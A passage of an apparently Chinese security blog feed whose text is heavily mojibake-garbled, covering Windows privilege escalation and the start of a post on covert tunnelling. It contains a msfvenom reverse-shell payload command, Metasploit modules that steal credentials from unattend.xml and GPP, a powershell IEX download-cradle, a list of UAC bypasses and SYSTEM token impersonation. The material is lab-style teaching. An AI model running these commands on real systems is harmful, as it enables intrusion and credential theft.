çš„ç¨‹åºé‡å‘½ä»¤å¹¶æ”¾ç½®åœ¨å­˜åœ¨æ­¤æ¼æ´ä¸”å¯å†™çš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:</span><br><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure><h4 id="02-msfåˆ©ç”¨"><a href="#02-msfåˆ©ç”¨" class="headerlink" title="02.msfåˆ©ç”¨"></a>02.msfåˆ©ç”¨</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/trusted_service_path </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/trusted_service_path):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; run</span><br><span class="line"></span><br><span class="line">[-] The Windows::WindowsServices mixin is deprecated, use Windows::Services instead</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Finding a vulnerable service...</span><br><span class="line">[-] Exploit failed: NameError undefined local variable or method `service_list&#x27; for #&lt;Msf::Modules::Exploit__Windows__Local__Trusted_service_path::Metasploit3:0x00007fca71a280d0&gt;</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">è¿™é‡Œæ²¡æœ‰åˆ©ç”¨æˆåŠŸ</span></span><br></pre></td></tr></table></figure><h3 id="4-è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶"><a href="#4-è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶" class="headerlink" title="4.è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶"></a>4.è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\Unattend.xml    #æœç´¢Unatted.xmlæ–‡ä»¶</span><br></pre></td></tr></table></figure><p><code>msfæŸ¥æ‰¾</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/enum_unattend </span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/enum_unattend):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   GETALL   true             yes       Collect all unattend.xml that are found</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Reading C:\Windows\panther\unattend.xml</span><br><span class="line">[+] Raw version of C:\Windows\panther\unattend.xml saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_989482.txt</span><br><span class="line">Unattend Credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line"> Type   Domain  Username        Password  Groups</span><br><span class="line"> ----   ------  --------        --------  ------</span><br><span class="line"> auto           administration</span><br><span class="line"> local          administration</span><br><span class="line"></span><br><span class="line">[+] Unattend Credentials saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_206680.txt</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; </span><br></pre></td></tr></table></figure><h3 id="5-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#5-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="5.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>5.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><code>AccessChkä½¿ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula    #é¦–æ¬¡ä½¿ç”¨æ¥å—è®¸å¯ï¼Œé»˜è®¤å¼¹æ¡†</span><br><span class="line">accesschk.exe -dqv &quot;C:\Windows&quot;    #æŸ¥çœ‹ç›®å½•æƒé™é…ç½®</span><br><span class="line">accesschk.exe -uwdqsUsers&quot;AuthenticatedUsers&quot;c:\*.* #åˆ—å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="0x03-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"><a href="#0x03-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ" class="headerlink" title="0x03.ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ"></a>0x03.ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ</h2><h3 id="1-è·å–ç»„ç­–ç•¥å‡­æ®-SYSVOL-GPP"><a href="#1-è·å–ç»„ç­–ç•¥å‡­æ®-SYSVOL-GPP" class="headerlink" title="1.è·å–ç»„ç­–ç•¥å‡­æ®(SYSVOL/GPP)"></a>1.è·å–ç»„ç­–ç•¥å‡­æ®(SYSVOL/GPP)</h3><h4 id="01-powershellè·å–cpassword"><a href="#01-powershellè·å–cpassword" class="headerlink" title="01.powershellè·å–cpassword"></a>01.powershellè·å–cpassword</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;.\Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msfè·å–"><a href="#02-msfè·å–" class="headerlink" title="02.msfè·å–"></a>02.msfè·å–</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/credentials/gpp </span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/credentials/gpp):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   ALL      true             no        Enumerate all domains on network.</span><br><span class="line">   DOMAINS                   no        Enumerate list of space separated domains DOMAINS=&quot;dom1 dom2&quot;.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   STORE    true             no        Store the enumerated files in loot.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Checking for group policy history objects...</span><br><span class="line">[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Checking for SYSVOL locally...</span><br><span class="line">[-] Error accessing C:\Windows\SYSVOL\sysvol : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Enumerating Domains on the Network...</span><br><span class="line">[*] Retrieved Domain(s) JIYE, WORKGROUP from network</span><br><span class="line">[*] Enumerating domain information from the local registry...</span><br><span class="line">[*] Retrieved Domain(s) JIYE from registry</span><br><span class="line">[*] Retrieved DC DC.JIYE.NET from registry</span><br><span class="line">[*] Enumerating DCs for JIYE on the network...</span><br><span class="line">[-] No Domain Controllers found for JIYE</span><br><span class="line">[*] Searching for Policy Share on DC.JIYE.NET...</span><br><span class="line">[-] Error accessing \\DC.JIYE.NET\SYSVOL : stdapi_fs_ls: Operation failed: The network path was not found.</span><br><span class="line">[*] Searching for Group Policy XML Files...</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; </span><br></pre></td></tr></table></figure><h2 id="0x04-UACç»•è¿‡ææƒ-msf"><a href="#0x04-UACç»•è¿‡ææƒ-msf" class="headerlink" title="0x04.UACç»•è¿‡ææƒ(msf)"></a>0x04.UACç»•è¿‡ææƒ(msf)</h2><blockquote><p>ä½¿ç”¨å‰æï¼š</p><p>ä¸€æ˜¯ç³»ç»Ÿå½“å‰ç”¨æˆ·å¿…é¡»åœ¨ç®¡ç†å‘˜ç»„ä¸­<br>äºŒæ˜¯ç”¨æˆ·è´¦æˆ·æ§åˆ¶ç¨‹åºUACè®¾ç½®ä¸ºé»˜è®¤ï¼Œå³ â€œä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘â€</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)</span><br><span class="line">1   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry</span><br><span class="line">2   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">3   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">4   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">5   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br><span class="line">6   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">7   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">8   exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)</span><br><span class="line">9   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)</span><br><span class="line">10  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)</span><br><span class="line">11  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">12  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-ä»¤ç‰Œç›—å–"><a href="#0x05-ä»¤ç‰Œç›—å–" class="headerlink" title="0x05.ä»¤ç‰Œç›—å–"></a>0x05.ä»¤ç‰Œç›—å–</h2><h3 id="1-msfç›—å–"><a href="#1-msfç›—å–" class="headerlink" title="1.msfç›—å–"></a>1.msfç›—å–</h3><blockquote><p>å½“è·å¾—meterpreteræ—¶å¯ä»¥ä½¿ç”¨</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: JIYE\Administrator</span><br><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">JIYE\Administrator</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-æ¼æ´å‘ç°&quot;&gt;&lt;a href=&quot;#0x01-æ¼æ´å‘ç°&quot; class=&quot;headerlink&quot; title=&quot;0x01.æ¼æ´å‘ç°&quot;&gt;&lt;/a&gt;0x01.æ¼æ´å‘ç°&lt;/h2&gt;&lt;h3 id=&quot;1-WMICå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;a href=&quot;#1-WMICå‘ç°å®‰è£…è¡¥ä¸&quot; class=&quot;headerlink&quot; title=&quot;1.WMICå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;/a&gt;1.WMICå‘ç°å®‰è£…è¡¥ä¸&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-msfå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;a href=&quot;#2-msfå‘ç°å®‰è£…è¡¥ä¸&quot; class=&quot;headerlink&quot; title=&quot;2.msfå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;/a&gt;2.msfå‘ç°å®‰è£…è¡¥ä¸&lt;/h3&gt;&lt;p&gt;&lt;code&gt;é¦–å…ˆä½¿ç”¨msfvenomç”Ÿæˆæ¶æ„ç¨‹åº&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &amp;gt; shell.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-éšè—é€šä¿¡éš§é“æŠ€æœ¯</title>
    <link href="https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
    <id>https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</id>
    <published>2021-07-24T09:30:16.000Z</published>
    <updated>2021-07-24T09:55:56.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-åŸºç¡€çŸ¥è¯†"><a href="#0x01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01.åŸºç¡€çŸ¥è¯†"></a>0x01.åŸºç¡€çŸ¥è¯†</h2><blockquote><p>å®Œæˆå†…ç½‘ä¿¡æ¯æœé›†åï¼Œéœ€è¦å…ˆåˆ¤æ–­æµé‡æ˜¯å¦å‡ºå¾—å»ã€è¿›å¾—æ¥ã€‚éšè—é€šä¿¡éš§é“æŠ€æœ¯å¸¸ç”¨äºåœ¨è®¿é—®å—é™çš„ç½‘ç»œç¯å¢ƒä¸­è¿½è¸ªæ•°æ®æµå‘å’Œåœ¨éå—ä¿¡ä»»çš„ç½‘ç»œä¸­å®ç°å®‰å…¨çš„æ•°æ®ä¼ è¾“ã€‚</p></blockquote><h3 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h3><p>â€‹        åœ¨æ¸—é€åœºæ™¯ä¸­ï¼Œå„ç§å®‰å…¨è®¾å¤‡ä¼šæ£€æŸ¥å¯¹å¤–è¿æ¥çš„æƒ…å†µï¼Œå¦‚æœå‘ç°å¼‚å¸¸ï¼Œå°±ä¼šå¯¹é€šä¿¡è¿›è¡Œé˜»æ–­ã€‚å› æ­¤å»ºç«‹ä¸“é—¨çš„éšè”½éš§é“å°±ååˆ†å¿…è¦ï¼Œè¿™èƒ½ç»•è¿‡ç«¯å£å±è”½ã€‚<br>å¸¸ç”¨çš„éš§é“å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ç»œå±‚éš§é“ï¼šIPv6ã€ICMPã€GRE</span><br><span class="line">ä¼ è¾“å±‚éš§é“ï¼šTCPã€UDPã€å¸¸è§„ç«¯å£è½¬å‘</span><br><span class="line">åº”ç”¨å±‚éš§é“ï¼šSSHã€HTTPã€HTTPSã€DNS</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="2-åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§"><a href="#2-åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§" class="headerlink" title="2.åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§"></a>2.åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§</h3><p>â€‹        åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§æ˜¯æŒ‡åˆ¤æ–­æœºå™¨èƒ½å¦ä¸Šå¤–ç½‘ç­‰ã€‚è¦ç»¼åˆåˆ¤æ–­å„ç§åè®®ï¼ˆTCPã€HTTPã€DNSã€ICMPç­‰ï¼‰åŠç«¯å£é€šä¿¡çš„æƒ…å†µã€‚å¸¸è§çš„å…è®¸æµé‡æµå‡ºçš„ç«¯å£æœ‰80ã€8080ã€443ã€53ã€110ã€123ç­‰ï¼Œå¸¸ç”¨çš„å†…ç½‘çš„è¿é€šæ€§åˆ¤æ–­æ–¹æ³•å¦‚ä¸‹ï¼š</p><p><code>ICMPåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p><code>TCPåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 10.1.1.5 3306</span><br></pre></td></tr></table></figure><p><code>DNSåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baiduc.om 8.8.8.8</span><br><span class="line">dig @8.8.8.8 www.baidu.com</span><br></pre></td></tr></table></figure><p><code>HTTPåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure><p>â€‹        è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯æµé‡ä¸èƒ½ç›´æ¥æµå‡ºï¼Œéœ€è¦åœ¨å†…ç½‘ä¸­è®¾ç½®ä»£ç†ï¼Œåˆ¤æ–­æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1ã€æŸ¥çœ‹ç½‘ç»œè¿æ¥ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸å…¶ä»–æœºå™¨çš„1080ï¼ˆä¸ç»å¯¹ï¼‰ç­‰ç«¯å£çš„è¿æ¥ï¼Œå¯å°è¯•è¿è¡Œping -n 1 -a ipå‘½ä»¤</span><br><span class="line">2ã€æŸ¥çœ‹å†…ç½‘ä¸­æ˜¯å¦æœ‰ä¸»æœºåç±»ä¼¼äº&quot;proxy&quot;çš„æœºå™¨ã€‚</span><br><span class="line">3ã€æŸ¥çœ‹IEæµè§ˆå™¨çš„ç›´æ¥ä»£ç†ã€‚</span><br><span class="line">4ã€æ ¹æ®pacï¼ˆä»£ç†è‡ªåŠ¨é…ç½®ï¼‰æ–‡ä»¶çš„è·¯å¾„ï¼ˆè¿œç¨‹ã€æœ¬åœ°ï¼‰ï¼Œå°†å…¶ä¸‹è½½å¹¶æŸ¥çœ‹ã€‚</span><br><span class="line">5ã€æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåˆ©ç”¨curlå·¥å…·ç¡®è®¤ï¼š</span><br><span class="line">    curl https://www.baidu.com            //ä¸é€š</span><br><span class="line">    curl -x proxy-ip:port www.baidu.com        //é€š</span><br></pre></td></tr></table></figure><h2 id="0x02-ç½‘ç»œå±‚éš§é“æŠ€æœ¯"><a href="#0x02-ç½‘ç»œå±‚éš§é“æŠ€æœ¯" class="headerlink" title="0x02.ç½‘ç»œå±‚éš§é“æŠ€æœ¯"></a>0x02.ç½‘ç»œå±‚éš§é“æŠ€æœ¯</h2><h3 id="1-IPv6éš§é“"><a href="#1-IPv6éš§é“" class="headerlink" title="1.IPv6éš§é“"></a>1.IPv6éš§é“</h3><blockquote><p>IPv6éš§é“æŠ€æœ¯æ˜¯æŒ‡é€šè¿‡IPv4éš§é“ä¼ è¾“IPv6æ•°æ®æŠ¥æ–‡çš„æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°†IPv6æŠ¥æ–‡æ•´ä½“å°è£…åœ¨IPv4æ•°æ®æŠ¥æ–‡ä¸­ï¼Œä»¥ä¾¿åœ¨IPv4éš§é“ä¸­ä¼ è¾“ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºç°é˜¶æ®µçš„éƒ¨åˆ†å®‰å…¨è®¾å¤‡æ— æ³•è¯†åˆ«IPv6çš„é€šä¿¡æŠ€æœ¯ï¼Œè€Œå¤§å¤šæ•°æ“ä½œç³»ç»Ÿæ”¯æŒIPv6ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æŸäº›è½¯ä»¶æ¥é…ç½®å…è®¸è¿›è¡ŒIPv6é€šä¿¡ä»¥æ­¤æ¥é¿å¼€é˜²ç«å¢™å’Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œè€Œå³ä½¿è®¾å¤‡æ”¯æŒIPv6ï¼Œä¹Ÿå¯èƒ½æ— æ³•æ­£ç¡®åˆ†æå°è£…äº†IPv6æŠ¥æ–‡çš„IPv4æ•°æ®åŒ…ã€‚</span><br><span class="line">æ”¯æŒIPv6éš§é“çš„å·¥å…·æœ‰socatã€6tunnelã€nt6tunnelç­‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="2-ICMPéš§é“"><a href="#2-ICMPéš§é“" class="headerlink" 